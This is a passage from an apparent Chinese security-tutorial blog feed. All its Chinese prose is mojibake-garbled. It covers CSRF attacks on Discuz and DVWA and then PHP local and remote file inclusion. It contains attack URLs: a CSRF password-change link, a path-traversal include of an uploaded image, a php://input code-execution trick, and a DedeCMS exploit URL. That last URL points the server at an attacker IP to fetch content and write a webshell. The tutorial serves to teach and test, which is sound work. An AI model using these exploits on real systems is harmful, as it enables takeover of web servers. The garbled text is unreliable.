<h4 id="ç¬¬ä¸‰æ­¥ï¼šåˆ©ç”¨æ™®é€šç”¨æˆ·å‘ä¸€ä¸ªå¸–å­ï¼Œå¸–å­çš„ä¿¡æ¯èƒ½å¤Ÿè¾¾åˆ°è¯±éª—ç®¡ç†å‘˜è®¿é—®çš„ç›®çš„ï¼Œé‡Œé¢çš„å›¾ç‰‡å†™ä¸Šæˆ‘ä»¬å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥ï¼Œå®½é«˜éƒ½æ˜¯0ï¼Œè¿™æ ·å°±ä¸ä¼šçœ‹åˆ°æˆ‘ä»¬çš„æ¶æ„ä»£ç "><a href="#ç¬¬ä¸‰æ­¥ï¼šåˆ©ç”¨æ™®é€šç”¨æˆ·å‘ä¸€ä¸ªå¸–å­ï¼Œå¸–å­çš„ä¿¡æ¯èƒ½å¤Ÿè¾¾åˆ°è¯±éª—ç®¡ç†å‘˜è®¿é—®çš„ç›®çš„ï¼Œé‡Œé¢çš„å›¾ç‰‡å†™ä¸Šæˆ‘ä»¬å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥ï¼Œå®½é«˜éƒ½æ˜¯0ï¼Œè¿™æ ·å°±ä¸ä¼šçœ‹åˆ°æˆ‘ä»¬çš„æ¶æ„ä»£ç " class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šåˆ©ç”¨æ™®é€šç”¨æˆ·å‘ä¸€ä¸ªå¸–å­ï¼Œå¸–å­çš„ä¿¡æ¯èƒ½å¤Ÿè¾¾åˆ°è¯±éª—ç®¡ç†å‘˜è®¿é—®çš„ç›®çš„ï¼Œé‡Œé¢çš„å›¾ç‰‡å†™ä¸Šæˆ‘ä»¬å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥ï¼Œå®½é«˜éƒ½æ˜¯0ï¼Œè¿™æ ·å°±ä¸ä¼šçœ‹åˆ°æˆ‘ä»¬çš„æ¶æ„ä»£ç "></a>ç¬¬ä¸‰æ­¥ï¼šåˆ©ç”¨æ™®é€šç”¨æˆ·å‘ä¸€ä¸ªå¸–å­ï¼Œå¸–å­çš„ä¿¡æ¯èƒ½å¤Ÿè¾¾åˆ°è¯±éª—ç®¡ç†å‘˜è®¿é—®çš„ç›®çš„ï¼Œé‡Œé¢çš„å›¾ç‰‡å†™ä¸Šæˆ‘ä»¬å¤‡ä»½æ•°æ®åº“çš„é“¾æ¥ï¼Œå®½é«˜éƒ½æ˜¯0ï¼Œè¿™æ ·å°±ä¸ä¼šçœ‹åˆ°æˆ‘ä»¬çš„æ¶æ„ä»£ç </h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_2.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/crrf_3.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_4.png" alt=""></p>
<h4 id="ç¬¬å››æ­¥ï¼šå¼•è¯±ç®¡ç†å‘˜è®¿é—®å¸–å­ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨ä¸¤ä¸ªä¸åŒçš„æµè§ˆå™¨ï¼Œè¿™æ ·å°±ä¸ä¼šå› ä¸ºcookieè€Œäº§ç”Ÿæ­§ä¹‰"><a href="#ç¬¬å››æ­¥ï¼šå¼•è¯±ç®¡ç†å‘˜è®¿é—®å¸–å­ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨ä¸¤ä¸ªä¸åŒçš„æµè§ˆå™¨ï¼Œè¿™æ ·å°±ä¸ä¼šå› ä¸ºcookieè€Œäº§ç”Ÿæ­§ä¹‰" class="headerlink" title="ç¬¬å››æ­¥ï¼šå¼•è¯±ç®¡ç†å‘˜è®¿é—®å¸–å­ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨ä¸¤ä¸ªä¸åŒçš„æµè§ˆå™¨ï¼Œè¿™æ ·å°±ä¸ä¼šå› ä¸ºcookieè€Œäº§ç”Ÿæ­§ä¹‰"></a>ç¬¬å››æ­¥ï¼šå¼•è¯±ç®¡ç†å‘˜è®¿é—®å¸–å­ï¼Œè¿™é‡Œæˆ‘ä½¿ç”¨ä¸¤ä¸ªä¸åŒçš„æµè§ˆå™¨ï¼Œè¿™æ ·å°±ä¸ä¼šå› ä¸ºcookieè€Œäº§ç”Ÿæ­§ä¹‰</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_5.png" alt=""></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_6.png" alt=""></p>
<h4 id="ç¬¬äº”æ­¥ï¼šè®¿é—®æˆ‘ä»¬è‡ªå·±æ„é€ çš„è·¯å¾„ï¼Œå³å¯å¾—åˆ°æ•°æ®åº“"><a href="#ç¬¬äº”æ­¥ï¼šè®¿é—®æˆ‘ä»¬è‡ªå·±æ„é€ çš„è·¯å¾„ï¼Œå³å¯å¾—åˆ°æ•°æ®åº“" class="headerlink" title="ç¬¬äº”æ­¥ï¼šè®¿é—®æˆ‘ä»¬è‡ªå·±æ„é€ çš„è·¯å¾„ï¼Œå³å¯å¾—åˆ°æ•°æ®åº“"></a>ç¬¬äº”æ­¥ï¼šè®¿é—®æˆ‘ä»¬è‡ªå·±æ„é€ çš„è·¯å¾„ï¼Œå³å¯å¾—åˆ°æ•°æ®åº“</h4><blockquote>
<p><a href="http://127.0.0.1:8080/discuz1.5/upload/uc_server/data/backup/xxxx/aaaa-1.sql" target="_blank" rel="external">http://127.0.0.1:8080/discuz1.5/upload/uc_server/data/backup/xxxx/aaaa-1.sql</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_7.png" alt=""></p>
<h3 id="0x04-2-CSRFä¿®æ”¹å¯†ç "><a href="#0x04-2-CSRFä¿®æ”¹å¯†ç " class="headerlink" title="0x04_2 CSRFä¿®æ”¹å¯†ç "></a>0x04_2 CSRFä¿®æ”¹å¯†ç </h3><p>æ¯”å¦‚æŸä¸€å¥—å¼€æºçš„CMSï¼ŒçŸ¥é“æ”¹å¯†ç çš„é“¾æ¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æŠŠè¿™äº›æ¶æ„ä»£ç ï¼ŒåµŒå…¥åˆ°æŸäº›é¡µé¢ï¼Œå¼•è¯±ç®¡ç†å‘˜æ¥è®¿é—®ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ”¹äº†ç®¡ç†å‘˜çš„å¯†ç ã€‚</p>
<p>è¿™é‡Œç”¨DVWAæ¥æ¼”ç¤ºå®ä¾‹ã€‚<br>è¿™é‡Œé»˜è®¤è´¦æˆ·å¯†ç ä¸ºadmin/password</p>
<h4 id="ç¬¬ä¸€æ­¥ï¼šè°ƒå®‰å…¨çº§åˆ«ä¸ºä½ï¼Œç‚¹å‡»csrf"><a href="#ç¬¬ä¸€æ­¥ï¼šè°ƒå®‰å…¨çº§åˆ«ä¸ºä½ï¼Œç‚¹å‡»csrf" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šè°ƒå®‰å…¨çº§åˆ«ä¸ºä½ï¼Œç‚¹å‡»csrf"></a>ç¬¬ä¸€æ­¥ï¼šè°ƒå®‰å…¨çº§åˆ«ä¸ºä½ï¼Œç‚¹å‡»csrf</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_11.png" alt=""></p>
<h4 id="ç¬¬äºŒæ­¥ï¼šæ„é€ æ¶æ„ä»£ç ï¼ŒåµŒå…¥åˆ°æŸä¸€é¡µé¢ï¼Œå¼•è¯±ç®¡ç†å‘˜è®¿é—®"><a href="#ç¬¬äºŒæ­¥ï¼šæ„é€ æ¶æ„ä»£ç ï¼ŒåµŒå…¥åˆ°æŸä¸€é¡µé¢ï¼Œå¼•è¯±ç®¡ç†å‘˜è®¿é—®" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šæ„é€ æ¶æ„ä»£ç ï¼ŒåµŒå…¥åˆ°æŸä¸€é¡µé¢ï¼Œå¼•è¯±ç®¡ç†å‘˜è®¿é—®"></a>ç¬¬äºŒæ­¥ï¼šæ„é€ æ¶æ„ä»£ç ï¼ŒåµŒå…¥åˆ°æŸä¸€é¡µé¢ï¼Œå¼•è¯±ç®¡ç†å‘˜è®¿é—®</h4><blockquote>
<p><a href="http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#" target="_blank" rel="external">http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_12.png" alt=""></p>
<h4 id="ç¬¬ä¸‰æ­¥ï¼šæˆåŠŸä¿®æ”¹ç®¡ç†å‘˜å¯†ç -ä¹‹å‰çš„å¯†ç æ— æ³•ç™»é™†"><a href="#ç¬¬ä¸‰æ­¥ï¼šæˆåŠŸä¿®æ”¹ç®¡ç†å‘˜å¯†ç -ä¹‹å‰çš„å¯†ç æ— æ³•ç™»é™†" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šæˆåŠŸä¿®æ”¹ç®¡ç†å‘˜å¯†ç ,ä¹‹å‰çš„å¯†ç æ— æ³•ç™»é™†"></a>ç¬¬ä¸‰æ­¥ï¼šæˆåŠŸä¿®æ”¹ç®¡ç†å‘˜å¯†ç ,ä¹‹å‰çš„å¯†ç æ— æ³•ç™»é™†</h4><p><img src="http://oa8y5guqs.bkt.clouddn.com/csrf_13.png" alt=""></p>
<h1 id="0x05-CSRFé˜²å¾¡"><a href="#0x05-CSRFé˜²å¾¡" class="headerlink" title="0x05 CSRFé˜²å¾¡"></a>0x05 CSRFé˜²å¾¡</h1><h3 id="0x05-1-æœåŠ¡ç«¯çš„é˜²å¾¡"><a href="#0x05-1-æœåŠ¡ç«¯çš„é˜²å¾¡" class="headerlink" title="0x05_1 æœåŠ¡ç«¯çš„é˜²å¾¡"></a>0x05_1 æœåŠ¡ç«¯çš„é˜²å¾¡</h3><pre><code>1.éªŒè¯HTTP Refererå­—æ®µ
2.è¯·æ±‚åœ°å€ä¸­æ·»åŠ tokenå¹¶éªŒè¯
3.åœ¨HTTPå¤´ä¸­è‡ªå®šä¹‰å±æ€§å¹¶éªŒè¯
4.åœ¨æœåŠ¡ç«¯ä¸¥æ ¼åŒºåˆ†å¥½POSTä¸GETçš„æ•°æ®è¯·æ±‚
5.ä½¿ç”¨éªŒè¯ç æˆ–è€…å¯†ç ç¡®è®¤æ–¹å¼è¿›è¡Œ
</code></pre><h3 id="0x05-2-ç”¨æˆ·ç«¯çš„é˜²å¾¡"><a href="#0x05-2-ç”¨æˆ·ç«¯çš„é˜²å¾¡" class="headerlink" title="0x05_2 ç”¨æˆ·ç«¯çš„é˜²å¾¡"></a>0x05_2 ç”¨æˆ·ç«¯çš„é˜²å¾¡</h3><h3 id="0x05-3-å®‰å…¨è®¾å¤‡çš„é˜²å¾¡"><a href="#0x05-3-å®‰å…¨è®¾å¤‡çš„é˜²å¾¡" class="headerlink" title="0x05_3 å®‰å…¨è®¾å¤‡çš„é˜²å¾¡"></a>0x05_3 å®‰å…¨è®¾å¤‡çš„é˜²å¾¡</h3>]]></content>
      
        
        <tags>
            
            <tag> æ¸—é€æµ‹è¯• </tag>
            
            <tag> CSRF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[æ–‡ä»¶åŒ…å«æ¼æ´æ€»ç»“]]></title>
      <url>/2016/07/19/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>ä¸¥æ ¼æ¥è¯´ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´æ˜¯â€œä»£ç æ³¨å…¥â€çš„ä¸€ç§ï¼Œå…¶åŸç†å°±æ˜¯æ³¨å…¥ä¸€æ®µç”¨æˆ·èƒ½æ§åˆ¶çš„è„šæœ¬æˆ–ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œã€‚â€œä»£ç æ³¨å…¥â€çš„å…¸å‹ä»£è¡¨å°±æ˜¯æ–‡ä»¶åŒ…å«ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´å¯èƒ½å‡ºç°åœ¨JSPã€PHPã€ASPç­‰è¯­è¨€ä¸­ï¼ŒåŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæœ¬æ–‡åªä»‹ç»PHPæ–‡ä»¶åŒ…å«æ¼æ´ã€‚<br><a id="more"></a></p>
<h1 id="0x01-ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿ"><a href="#0x01-ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿ" class="headerlink" title="0x01 ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿ"></a>0x01 ä»€ä¹ˆæ˜¯æ–‡ä»¶åŒ…å«æ¼æ´ï¼Ÿ</h1><p>ç®€å•çš„æ¥è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬ç”¨ä¸€ä¸ªå¯æ§çš„å˜é‡ä½œä¸ºæ–‡ä»¶åå¹¶ä»¥æ–‡ä»¶åŒ…å«çš„çš„æ–¹å¼è°ƒç”¨äº†å®ƒï¼Œæ¼æ´å°±äº§ç”Ÿäº†ã€‚ä»¥PHPä¸ºä¾‹æ–‡ä»¶åŒ…å«æ¼æ´å¯ä»¥åˆ†ä¸ºRFI(è¿œç¨‹æ–‡ä»¶åŒ…å«)å’ŒLFIï¼ˆæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼‰ä¸¤ç§ã€‚è€ŒåŒºåˆ†ä»–ä»¬æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯php.iniä¸­æ˜¯å¦å¼€å¯äº†allow_url_includeã€‚å¦‚æœå¼€å¯äº†æˆ‘ä»¬å°±æœ‰å¯èƒ½åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œå¦‚æœä¸æ˜¯æˆ‘ä»¬æœ‰å¯èƒ½åŒ…å«æœ¬åœ°çš„æ–‡ä»¶ã€‚</p>
<h1 id="0x02-æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Ÿ"><a href="#0x02-æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Ÿ" class="headerlink" title="0x02 æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Ÿ"></a>0x02 æ–‡ä»¶åŒ…å«æ¼æ´äº§ç”Ÿçš„åŸå› ï¼Ÿ</h1><p>PHPæ–‡ä»¶åŒ…å«æ¼æ´çš„äº§ç”ŸåŸå› æ˜¯åœ¨é€šè¿‡PHPçš„å‡½æ•°å¼•å…¥æ–‡ä»¶æ—¶ï¼Œç”±äºä¼ å…¥çš„æ–‡ä»¶åæ²¡æœ‰ç»è¿‡åˆç†çš„æ ¡éªŒï¼Œä»è€Œæ“ä½œäº†é¢„æƒ³ä¹‹å¤–çš„æ–‡ä»¶ï¼Œå°±å¯èƒ½å¯¼è‡´æ„å¤–çš„æ–‡ä»¶æ³„éœ²ç”šè‡³æ¶æ„çš„ä»£ç æ³¨å…¥ã€‚</p>
<h1 id="0x03-PHPåŒ…å«æ¼æ´åˆ†ç±»"><a href="#0x03-PHPåŒ…å«æ¼æ´åˆ†ç±»" class="headerlink" title="0x03 PHPåŒ…å«æ¼æ´åˆ†ç±»"></a>0x03 PHPåŒ…å«æ¼æ´åˆ†ç±»</h1><p>ä¸»è¦åˆ†ä¸ºä¸¤ç±»ï¼š</p>
<pre><code>1ã€æœ¬åœ°æ–‡ä»¶åŒ…å«LFI
2ã€è¿œç¨‹æ–‡ä»¶åŒ…å«RFIï¼ˆéœ€è¦php.iniä¸­allow_url_include=onï¼‰
</code></pre><p>PHPä¸­å››ä¸ªåŒ…å«æ–‡ä»¶çš„å‡½æ•°ï¼š</p>
<blockquote>
<p>include(),include_once(),require()å’Œrequire_once()</p>
</blockquote>
<p>å®ƒä»¬çš„åŒºåˆ«åœ¨äºï¼š</p>
<pre><code>include(),include\_once()åœ¨åŒ…å«æ–‡ä»¶æ—¶ï¼Œå³ä½¿é‡åˆ°é”™è¯¯ï¼Œä¸‹é¢çš„ä»£ç ä¾ç„¶ä¼šç»§ç»­æ‰§è¡Œï¼›
è€Œrequire()å’Œrequire_once()åˆ™ä¼šæŠ¥é”™ï¼Œç›´æ¥é€€å‡ºç¨‹åºã€‚
</code></pre><h1 id="0x04-æœ¬åœ°æ–‡ä»¶åŒ…å«"><a href="#0x04-æœ¬åœ°æ–‡ä»¶åŒ…å«" class="headerlink" title="0x04 æœ¬åœ°æ–‡ä»¶åŒ…å«"></a>0x04 æœ¬åœ°æ–‡ä»¶åŒ…å«</h1><p>æµ‹è¯•ä»£ç main.phpï¼š</p>
<pre><code>&lt;?php
echo &quot;Hello,this is file_include test!&quot;;
//åˆå§‹åŒ–
define(&quot;ROOT&quot;,dirname(_File_).&apos;/&apos;);
//åŠ è½½æ¨¡å—
$page = $_GET[&apos;page&apos;];
echo ROOT.$page.&apos;.php&apos;;
include(ROOT.$page.&apos;.php&apos;)
?&gt;
</code></pre><p>åœ¨åŒç›®å½•ä¸‹åˆ›å»º1.php:</p>
<pre><code>&lt;?php phpinfo();?&gt;
</code></pre><p>è¯·æ±‚/main.php?page=1</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_1.png" alt=""></p>
<h1 id="0x05-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#0x05-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="0x05 è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>0x05 è¿œç¨‹æ–‡ä»¶åŒ…å«</h1><p>åŸºäºHTTPåè®®çš„æµ‹è¯•ä»£ç </p>
<pre><code>&lt;?php
include($_GET[&apos;url&apos;]);
?&gt;
</code></pre><p>åœ¨è¿œç¨‹ä¸»æœºæ”¾å…¥ä¸€ä¸ª2.txtï¼Œå†…å®¹ä¸º</p>
<pre><code>&lt;?php phpinfo();?&gt;
</code></pre><p>åœ¨è¯·æ±‚çš„urlå‚æ•°ä¸­ä¼ å…¥2.txtçš„åœ°å€<code>http://oacotcyq8.bkt.clouddn.com/2.txt</code><br>è¿”å›æœ¬æœºçš„phpinfoä¿¡æ¯ã€‚</p>
<p>è¿œç¨‹æ–‡ä»¶åŒ…å«è¿˜æœ‰ä¸€ç§åˆ©ç”¨PHPè¾“å…¥è¾“å‡ºæµçš„åˆ©ç”¨æ–¹å¼ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡ŒPOSTä»£ç ï¼Œåªè¦æ‰§è¡ŒPOSTè¯·æ±‚<code>main.php?url=php://input</code>,POSTçš„å†…å®¹ä¸º<code>&lt;?php phpinfo();?&gt;</code>,å³å¯æ‰“å°å‡ºphpinfoä¿¡æ¯ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_2.png" alt=""></p>
<h1 id="0x06-æ–‡ä»¶åŒ…å«æ¼æ´å®ä¾‹"><a href="#0x06-æ–‡ä»¶åŒ…å«æ¼æ´å®ä¾‹" class="headerlink" title="0x06 æ–‡ä»¶åŒ…å«æ¼æ´å®ä¾‹"></a>0x06 æ–‡ä»¶åŒ…å«æ¼æ´å®ä¾‹</h1><h3 id="0x06-1-æœ¬åœ°æ–‡ä»¶åŒ…å«å®ä¾‹"><a href="#0x06-1-æœ¬åœ°æ–‡ä»¶åŒ…å«å®ä¾‹" class="headerlink" title="0x06_1 æœ¬åœ°æ–‡ä»¶åŒ…å«å®ä¾‹"></a>0x06_1 æœ¬åœ°æ–‡ä»¶åŒ…å«å®ä¾‹</h3><p>1.é¦–å…ˆæœ‰ä¸ªæ­£å¸¸çš„å›¾ç‰‡ï¼Œé‡Œé¢åŒ…å«ä¸€ä¸ªphpinfo()å‡½æ•°ã€‚</p>
<p>2.æ‰“å¼€DVWAä¸Šä¼ å«æ¶æ„ä»£ç çš„å›¾ç‰‡</p>
<p>3.åˆ©ç”¨æ–‡ä»¶åŒ…å«è®¿é—®é“¾æ¥ï¼š</p>
<blockquote>
<p><a href="http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg" target="_blank" rel="external">http://127.0.0.1:8080/DVWA-1.9/vulnerabilities/fi/?page=../../hackable/uploads/1.jpg</a></p>
</blockquote>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_3.png" alt=""><br><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_4.png" alt=""></p>
<h3 id="0x06-2-è¿œç¨‹æ–‡ä»¶åŒ…å«å®ä¾‹"><a href="#0x06-2-è¿œç¨‹æ–‡ä»¶åŒ…å«å®ä¾‹" class="headerlink" title="0x06_2 è¿œç¨‹æ–‡ä»¶åŒ…å«å®ä¾‹"></a>0x06_2 è¿œç¨‹æ–‡ä»¶åŒ…å«å®ä¾‹</h3><p>ä»¥Dedecmsçš„ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ä¸ºä¾‹</p>
<p>DedeCms &lt; 5.7-sp1è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œåœ¨äº†è§£è¿™ä¸ªæ¼æ´ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹ApacheæœåŠ¡å™¨è§£ææ–‡ä»¶æµç¨‹ã€‚</p>
<p>å½“Apacheæ£€æµ‹åˆ°ä¸€ä¸ªæ–‡ä»¶æœ‰å¤šä¸ªæ‰©å±•åæ—¶ï¼Œæ¯”å¦‚1.php.bak,ä¼šä»å³å‘å·¦åˆ¤æ–­ï¼Œå› ä¸ºbakæ‰©å±•åApacheä¸è®¤è¯†ï¼Œæ‰€ä»¥å°±è¦å‘å‰è§£æï¼Œç›´åˆ°æœ‰ä¸€ä¸ªApacheè®¤è¯†çš„æ‰©å±•åï¼Œå¦‚æœå…¨éƒ¨çš„æ‰©å±•åéƒ½ä¸è®¤è¯†ï¼Œé‚£ä¹ˆä¼šæŒ‰ç…§httpd.confé…ç½®ä¸­æŒ‡å®šçš„æ–¹å¼è¿›è¡Œå±•ç¤ºï¼Œä¸€èˆ¬é»˜è®¤çš„æ˜¯â€œtext/plainâ€è¿™ç§æ–¹å¼ã€‚æˆ‘ä»¬äº†è§£å®Œè¿™ä¸ªå†…å®¹åå†æ¥åˆ†æä¸‹é¢è¿™ä¸ªæ¼æ´ã€‚</p>
<p>è¿™ä¸ªé—®é¢˜å‡ºç°åœ¨install/index.php.bakè¿™ä¸ªæ–‡ä»¶ã€‚çœ‹ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„ä»£ç ï¼š</p>
<pre><code>&lt;php?
â€¦â€¦.
else if($step==11)
{
require_once(â€˜../data/admin/config_update.phpâ€™);
$rmurl = $updateHost.â€dedecms/demodata.{$s_lang}.txtâ€;
echo $rmurl;
$sql_content = file_get_contents($rmurl);
$fp = fopen($install_demo_name,â€™wâ€™);
if(fwrite($fp,$sql_content))
echo â€˜  [âˆš] å­˜åœ¨(æ‚¨å¯ä»¥é€‰æ‹©å®‰è£…è¿›è¡Œä½“éªŒ)â€™;
else
echo â€˜  [Ã—] è¿œç¨‹è·å–å¤±è´¥â€™;
unset($sql_content);
fclose($fp);
exit();
â€¦â€¦
?&gt;
</code></pre><p>åœ¨ä¸Šé¢çš„ä»£ç ä¸­æˆ‘ä»¬çœ‹åˆ°åœ¨step=11ä¸­ï¼Œé¦–å…ˆåŒ…å«äº†/data/admin/config_update.phpè¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬å†æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>
<pre><code>&lt;?php
/**
 * æ›´æ–°æœåŠ¡å™¨ï¼Œå¦‚æœæœ‰å˜åŠ¨ï¼Œè¯·åˆ° http://bbs.dedecms.com æŸ¥è¯¢
 *
 * @version        $Id: config_update.php 1 11:36 2011-2-21 tianya $
 * @package        DedeCMS.Administrator
 * @copyright      Copyright (c) 2007 - 2010, DesDev, Inc.
 * @license        http://help.dedecms.com/usersguide/license.html
 * @link           http://www.dedecms.com
 */

//æ›´æ–°æœåŠ¡å™¨ï¼Œå¦‚æœæœ‰å˜åŠ¨ï¼Œè¯·åˆ° http://bbs.dedecms.com æŸ¥è¯¢
$updateHost = &apos;http://updatenew.dedecms.com/base-v57/&apos;;
$linkHost = &apos;http://flink.dedecms.com/server_url.php&apos;;
</code></pre><p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_5.png" alt=""></p>
<p>æŒ‡å®šäº†updateHostå˜é‡çš„å€¼ã€‚çœ‹èµ·æ¥æ˜¯æ²¡æœ‰åŠæ³•åŒ…å«çš„ï¼Œå› ä¸ºå˜é‡æ˜¯å›ºå®šå€¼ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æŒ‡å®šäº†install_demo_nameæ˜¯config_update.phpè¿™æ–‡ä»¶ï¼Œå¹¶ä¸”å†…å®¹æ˜¯ä¸€ä¸ª404çš„æ–‡ä»¶ï¼Œæƒ…å½¢æ˜¯æ€ä¹ˆæ ·å­çš„å‘¢ï¼Ÿ</p>
<p>æˆ‘ä»¬å…ˆæ¥è®¿é—®è¿™ä¸ªurl:<br><code>http://127.0.0.1/ DedeCMS-5.7-UTF8-SP1/uploads/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/admin/config_update.php</code></p>
<p>è¿™ä¼šè®©ä»£ç åˆ°</p>
<blockquote>
<p>http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt</p>
</blockquote>
<p>ä¸­å–å†…å®¹å†™å…¥åˆ°</p>
<p><code>config_update.phpï¼Œdemodata.a.txt</code>ã€‚<br>ä½ å¯èƒ½æƒ³è¦é—®äº†<br><code>http:// updatenew.dedecms.com/base-v57/dedecms/demodata.a.txt</code> è¿™ä¸ªæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿæˆ‘ä»¬è®¿é—®ä¸€ä¸‹</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_6.png" alt=""></p>
<p>å…¶å®ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰€ä»¥å˜é‡è¦†ç›–ä»¥åï¼Œæˆ‘ä»¬æ‰“å¼€config_update.phpä»¥åï¼Œé‡Œé¢å·²ç»ä»€ä¹ˆéƒ½æ²¡æœ‰äº†</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_7.png" alt=""></p>
<p>è¿™æ ·updataHostå˜é‡çš„å€¼ä¾¿æ²¡æœ‰è¢«åˆå§‹åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬æƒ³å†™ä»€ä¹ˆå°±å†™ä»€ä¹ˆäº†ï¼Œè¿™æ ·å°±å®Œæˆäº†ä¸€ä¸ªè¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´çš„åˆ©ç”¨ã€‚æ„é€ ä¸€ä¸ªurlå³å¯å®Œæˆæ”»å‡»ï¼š</p>
<pre><code>http://127.0.0.1/install/index.php.bak?step=11&amp;insLockfile=a&amp;s_lang=a&amp;install_demo_name=../data/xxx.php&amp;updateHost=http://192.168.2.3/
</code></pre><h3 id="0x06-2-1-ç¼–å†™è„šæœ¬æµ‹è¯•"><a href="#0x06-2-1-ç¼–å†™è„šæœ¬æµ‹è¯•" class="headerlink" title="0x06_2.1 ç¼–å†™è„šæœ¬æµ‹è¯•"></a>0x06_2.1 ç¼–å†™è„šæœ¬æµ‹è¯•</h3><p>1.å¼€å§‹æµ‹è¯•ï¼Œæ‰“å¼€dedecmsï¼Œå¯ä»¥æ­£å¸¸è®¿é—®</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_10.png" alt=""></p>
<p>2.ç„¶åæ£€æµ‹è„šæœ¬æ˜¯å¦å¯ä»¥æ­£å¸¸è¿è¡Œ</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_11.png" alt=""></p>
<p>3.è„šæœ¬å¯ä»¥æ­£å¸¸è¿è¡Œï¼Œç„¶åæˆ‘ä»¬æµ‹è¯•æ¼æ´æ˜¯å¦å¯ä»¥åˆ©ç”¨æˆåŠŸï¼Œæˆ‘ä»¬æŸ¥çœ‹è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶ï¼Œå¦‚ä¸‹å›¾,æˆ‘ä»¬åœ¨ç›®å½•C:\wamp\www\dedecms\demodata.a.txtä¸­å†™å…¥éœ€è¦æˆ‘ä»¬å†™å…¥webæœåŠ¡å™¨ä¸­çš„å†…å®¹ï¼Œè¿™æ ·å°±å¯ä»¥å†™å…¥xxx.phpçš„æ–‡ä»¶ä¸­ï¼Œä»è€Œè¾¾åˆ°getshellçš„ç›®çš„ã€‚</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_12.png" alt=""></p>
<p>4.æ”»å‡»è€…è¿œç¨‹IPåœ°å€</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_13.png" alt=""></p>
<p>5.ç„¶åæˆ‘ä»¬æµ‹è¯•æ¼æ´åˆ©ç”¨</p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/file_include_14.png" alt=""></p>
